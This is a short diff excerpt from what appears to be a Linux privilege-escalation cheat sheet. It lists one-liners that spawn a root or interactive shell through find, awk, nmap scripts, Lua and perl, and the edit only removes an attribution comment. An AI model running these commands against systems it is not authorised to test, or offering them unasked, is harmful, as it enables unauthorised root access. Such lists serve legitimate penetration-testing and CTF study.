@@ -65,7 +65,7 @@ find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
 awk 'BEGIN {system("/bin/bash")}'
 --interactive
 echo "os.execute('/bin/sh')"
-sudo nmap --script=exploit.nse    nmap (thanks to comment by anonymous below)
+sudo nmap --script=exploit.nse
 perl -e 'exec "/bin/bash";'*
 
 
